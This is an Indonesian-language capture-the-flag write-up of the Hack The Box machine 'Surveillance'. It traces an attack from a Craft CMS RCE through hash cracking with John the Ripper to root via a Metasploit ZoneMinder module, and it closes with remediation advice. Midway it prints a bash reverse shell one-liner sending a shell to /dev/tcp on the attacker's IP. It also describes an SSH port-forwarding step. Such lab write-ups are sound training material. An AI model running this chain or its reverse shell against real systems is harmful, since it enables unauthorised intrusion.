# **WRITE UP SURVEILLANCE**

## _**Executive Summary**_

Pada machine HTB Surveillance kali ini, machine akan dilakukan exploitation pada bagian craftCMS nya yang mana dapat dihubungkan dengan menggunakan python script (vulnerability dari craftCMS nya) agar bisa mendapatkan shell dari web nya, dari sini saya dapat menemukan nama user yang ada di dalam web nya yg dapat digunakan untuk SSH(nama usernya: matthew). Kemudian dilanjutkan dengan melakukan reverse shell, yang memberikan saya berbagai macam directory yang dapat saya visit di dalam database. 

Lalu dilakukan exploitation pada directory database yang mana dapat memberikan saya sebuah file yang berisi sebuah hash yang di identify tipe hashnya menggunakan hash identifier dan dapat di crack menggunakan john the ripper. Dari hash tersebut, berisi sebuah password yang dapat digunakan untuk melakukan ssh pada user matthew yang berhasil memberikan saya flag dari user.

Setelah itu, saya akan menggunakan tool LinPEAS yang mana akan memberikan saya berbagai macam informasi yang dapat membantu saya salah satunya untuk menaikkan privilege user untuk mendapatkan root flagnya. Dari LinPEAS yang dilakukan, saya mendapatkan password yang mungkin dapat digunakan untuk SSH dan sebuah OS bernama zoneminder.

Setelah melakukan LinPEAS, saya juga melakukan port forwarding agar dapat membuka web surveillance.htb yang dibuka pada pc matthew secara locally di kali linux saya (karena ada kemungkinan web surveillance.htb yang dibuka di pc matthew hanya dapat dibuka di pc matthew) yang memberikan saya sebuah page zoneminder login.

Dari situ saya melakukan googling untuk mengexploit OS zoneminder dan ternyata saya dapat menggunakan metasploit. Dengan menggunakan metasploit, berhasil membawa saya sebagai user zoneminder yang dilanjutkan dengan melakukan reverse shell yang membawa saya ke root flagnya.

## _**Information Gathering**_

Pada challenge Hack The Box ini, saya diberikan sebuah machine bernama Surveillance.

Pertama tama, seperti biasa saya akan mencoba nmap terlebih dahulu untuk mengetahui port apa saja yang terbuka pada ip machine yg diberikan

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/1dd26258-578b-4e0f-a488-d956ce14ed57)

Dari hasil nmap diatas, terdapat port 80 yang bisa saya buka, saya mencoba masuk kedalam port itu dan ternyata membawa saya ke web `surveillance.htb`

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/940d92b2-ab94-4bb2-9c69-d42466489769)

Dari web diatas, setelah saya analisis tampaknya tidak banyak yang bisa saya lakukan dalam web tersebut. Disini saya mengsuspect jika dalam web page ini terdapat hidden directory yang harus saya cari.

Disini saya mencoba untuk melakukan gobuster pada web surveillance.htb untuk mencari hidden directorynya

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/e13519e9-24ec-474b-a36f-552473e37e9d)

Dari hasil gobuster tersebut, saya menemukan beberapa hidden directory, tapi ada satu directory yang menarik perhatian saya yaitu directory /admin

Dari situ saya mencoba untuk masuk kedalam directory /admin nya untuk mengecek ada apa di dalam directory tersebut

## _**Service Enumeration**_

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/0fe3f30d-0fb0-4506-b9ee-9b097355b4c6)

Dari directory tersebut, ternyata saya diarahkan kedalam sebuah login page, namun dari login page ini, saya mengsuspect apabila cara untuk mengbypass nya menggunakan sql injection. 
Tapi saya mencoba melakukan beberapa analisis terlebih dahulu untuk mengumpulkan clue tambahan.

Dari tampilan login page ini, terdapat tulisan `craft cms`. Disini saya kurang tau apa itu craft cms tapi saya mencoba untuk melanjutkan analisis saya terlebih dahulu. Saat saya mencoba view page source dan menganalisis codingannya, saya menemukan sebuah link github yg berisi semacam penjelasan tentang version craft cms.

Dari situ saya melanjutkan googling pada version craft cms nya dan menemukan sebuah **RCE PoC** dari github

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/74d4acf8-406b-467e-ab07-6829d17dc145)

Dari analisis yang lebih lanjut melalui github yang saya temui, ternyata ada bagian codingan yang bisa saya ganti untuk mengexploit vulnerabilitynya, dari situ saya mengcopy codingannya dan saya save ke dalam local kali linux saya agar bisa saya edit

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/2e360376-5fe4-4c37-bb2b-5a185e09dfe9)

Dari sini saya langsung ganti proxiesnya ke web surveillance.htb dan kemudian saya save dalam bentuk python script

Setelah saya selesai mengedit dan sudah saya save, saya jalankan python script tersebut dan saya hubungkan dengan web surveillance.htb nya. Ternyata dari situ saya misa mendapatkan shell dari web nya.

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/64c42340-59eb-432b-92e8-232cb3d6f268)

saya mencoba melakukan command `cat /etc/passwd` agar saya bisa melihat isi dari shell ini dan dari situ saya mendapatkan `user matthew`

Disini saya mencoba melakukan rev shell lagi dari shell yang saya dapatkan dengan command:

`bash -c "bash -i >& /dev/tcp/10.10.16.64/1234 0>&1"`

Sebelum saya mengexecute command reverse shell tersebut, saya sudah menjalankan `netcat` terlebih dahulu pada port yang ingin saya listen dan setelah saya execute, saya berhasil mendapatkan reverse shell connectionnya

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/c49e1725-897a-442e-8084-cbbcfce7d8e2)

## _**Exploitation**_

Setelah saya mendapatkan reverse shell nya, saya mendapatkan cukup banyak directory yang bisa saya visit. Karena saya ingin menghemat waktu, saya langsung mengetik tree saja agar terlihat file apa saja yang terdapat dalam directory tersebut

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/65e5bc5b-293a-4208-8d79-edaea57eaded)

Dari sini saya mencoba mundur untuk melihat ada directory apa saja dalam shell tersebut dan ternyata saya menemukan sebuah directory craft yang ternyata setelah saya buka terdapat masih banyak directory lainnya.

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/8c98ca69-2989-4869-8575-ee3847fd3ba8)

Dari sini saya mencoba masuk kedalam directory storage dan saat saya lakukan command `ls`, 
ternyata terdapat beberapa directory yang menarik tapi yang paling menarik adalah directory `backups`. 
saya mencoba untuk masuk ke dalam directory backups tersebut dan didalamnya ternyata saya menemukan sebuah **zip file**.

Dari situ saya mencoba untuk mengcopy zip file tersebut agar bisa saya buka locally dengan command:

`cp ~/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip ~/html/craft/web/surveillance--2023-10-17-202801--v4.4.14.sql.zip`

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/f127c7c8-bb91-4b1f-aad9-5b48187b1ed6)

Setelah melakukan command `cp`, saya melakukan wget dr web surveillance.htb untiuk mendapatkan file zip nya.

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/2f8a6df7-b1b0-457c-97f8-fe382fa10b49)

Dari file zip yang saya dapatkan, saya melakukan analisis dan ternyata mendapatkan sebuah hash yang bisa saya gunakan. Dari sini saya menggunakan hash identifier untuk mengecek tipe hash yang digunakan agar bisa saya crack.

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/358375a6-a8ef-4551-8655-e38933f59732)

Setelah di identify, ternyata hash tersebut menggunakan hash `SHA-256`. 
Dari situ saya langsung memasukkan hash tersebut kedalam sebuah file.txt untuk dilakukan decryption.

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/8ad15fb5-977e-495c-8845-f508e5707a06)

Untuk decryption tool yang saya gunakan adalah `john the ripper` karena saya sudah pernah menggunakan sebelumnya pada lomba CTF jadi saya sudah lebih familiar dengan cara kerja tool nya. 
Dari decryption tersebut saya menggunakan library `rockyou.txt` dan setelah prosesnya selesai, saya mendapatkan sebuah password.

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/7092a0ef-a7f5-469e-a295-61acdd5013bf)

## _**Flag Retrieval**_

Karena sebelumnya saya menemukan user matthew, saya mengsuspect jika pass ini adalah pass untuk user matthew, maka saya langsung meng ssh user matthew dan betul saja apabila pass tersebut adalah pass user matthew.

saya mencoba untuk melakukan command ls pada user matthew dan dari situ saya menemukan user flag nya.

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/2b3307ba-8df5-4afd-af19-4da5154b5154)

Kemudian untuk menemukan root flagnya, disini saya agak kebingungan karena saya sudah mencoba googling tapi cukup ngestuck. 
Tapi kebetulan saya diberikan tips oleh teman saya untuk mencari root flagnya. Tips yang diberikan adalah dengan menggunakan `LinPEAS`.

Dengan memakai **LinPEAS**, tool ini dapat memberikan saya cukup banyak informasi dan informasi tersebut dapat saya gunakan untuk **privilege escalation** biar bisa ngedapetin root flag nya karena harus jadi root dulu baru bisa ngebuka root flagnya.

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/a3b9399f-8ec7-4972-a0b8-69cc49e65d0a)

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/a62e6547-0ece-4d9b-84d8-381ae18a7806)

Dari scanning LinPEAS diatas, saya dapat menemukan port tempat web surveillance.htb dijalankan dari pc matthew. 
Tapi tidak hanya itu, ada satu bagian scan yang memberikan informasi cukup menarik.

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/a68b848e-ac10-4fa4-b8c5-6b63cfadd9d6)

Dari informasi diatas yang saya dapatkan menggunakan LinPEAS, password tersebut kemungkinan bisa saya gunakan untuk melakukan ssh. 
Tapi ada juga informasi lainnya yaitu kata `zoneminder`. 
saya mencoba googling apa itu zoneminder dan ternyata zoneminder ini adalah sebuah open source OS.

Disini saya menjadi terpikirkan ide lain, apabila web surveillance.htb yang digunakan pada pc matthew hanya bisa dibuka pada pc matthew saja, 
maka saya dapat melakukan `port forwarding` agar saya dapat membukanya locally dari kali linux saya. 
Dari situ saya mencoba melakukan local port forwarding dengan command:

`ssh -L 1234:127.0.0.1:8080 matthew@surveillance.htb`

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/3ede3f8a-73f4-4ebc-a3f8-81d088ccd62b)

Setelah saya lakukan port forwarding tampilan web nya akan menjadi seperti gambar dibawah

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/59da537a-645f-4b12-9fca-d7b1a5a315be)

Setelah saya melakukan port forwarding, ide lain yang terpikirkan adalah cara untuk mengexploitnya. Sebelumnya saya menemukan apabila web ini dijalankan dengan Open Source OS zoneminder. Dari sini saya berpikir apabila OS yang dijalankan pada zoneminder memiliki vulnerability yang bisa saya exploit.

Awalnya saya agak kebingungan tool atau cara apa yang harus saya pakai untuk melakukan exploitnya. Setelah saya googling, beberapa menyarankan untuk menggunakan metasploit, maka dari itu saya langsung menggunakan metasploit.

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/00d2930a-731a-494d-b9c0-e40b66ab208e)

Kebetulan metasploitnya sudah diupdate, jadi saat saya search zoneminder akan muncul 3 file dibawah ini (apabila belom diupdate, kemungkinan file nomor 1 yang snapshot tidak muncul)

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/6dcda085-7611-4cc8-b359-66fd2f35f2ae)

Kemudian saya use 1 (menggunakan file snapshot) untuk melakukan exploitnya, lalu saya melakukan beberapa konfigurasi seperti `set RHOST, RPORT, TARGETURI, LHOST, LPORT` dan `AutoCheck` seperti gambar dibawah

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/4e0842ae-d3c8-4403-9328-34b35362f46e)

Setelah saya run, beberapa saat akan muncul meterpreter

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/dbc8edd9-704c-4c06-962f-4c7c9f6839f6)

saya mencoba `whoami` dan ternyata saya telah berhasil masuk sebagai zoneminder

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/a2320aca-ae5d-4864-8cb8-eaeb818141c6)

Disini kemudian saya melakukan searching agar saya dapat melakukan reverse shell pada zoneminder, kemudian saya coba menggoogling dan menemukan sebuah script yang bisa saya buat untuk melakukan reverse shell nya

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/b195ea26-ba5b-46f1-8d23-0b293967923a)

Disini scriptnya saya save dalam format `.sh`, kemudian akan saya coba upload ke dalam meterpreternya

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/a6601b25-e770-47f1-b9ee-5e1cc47e67a3)

Lalu saya akan mencoba menjalankan shell nya, tapi sebelum saya jalankan, saya akan melakukan `netcat` pada port yang saya mau listen (portnya juga sama dengan yang saya tulis dalam script). Sesudah saya netcat, saya mencoba run shell nya

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/fb7f5c98-202b-4fcf-8e83-6be6244ca586)

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/404acc9d-5e75-4555-ae28-c0190491dbd8)

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/503469c5-d6ed-4a10-853f-8bb03afb59d9)

Disini saya berhasil masuk sebagai rootnya, kemudian saya mencoba command ls dan ternyata ada directory root, saya coba masuk ke dalam directorynya dan saya temukan root flagnya

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/5ddcb9d1-9b13-4ad5-a7f8-96d2a5ca7186)

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/e5cfc63b-054b-4501-a299-dedc05d2f73a)

## _**Guidelines for remediation:**_
- Menggunakan software paling terupdate atau terbaru (software zoneminder versi paling terbaru) agar mendapatkan security level paling aman
- Melakukan update pada framework CraftCMS
- Memberikan restriction access kepada user biasa (karena dalam pengetesan, user tanpa privilege atau user biasa dapat mengakses file file penting dalam server)
- Melakukan restriction pada inputan yang terhubung dengan database agar user tidak menginject code berbahaya seperti melakukan sql injection ataupun command injection
- Menggunakan tipe hash password yang lebih aman (contoh bisa dengan menggunakan metode salt)
- Melakukan testing setelah semua perbaikan diimplementasi untuk memastikan apabila ada vulnerability yang tidak terdeteksi

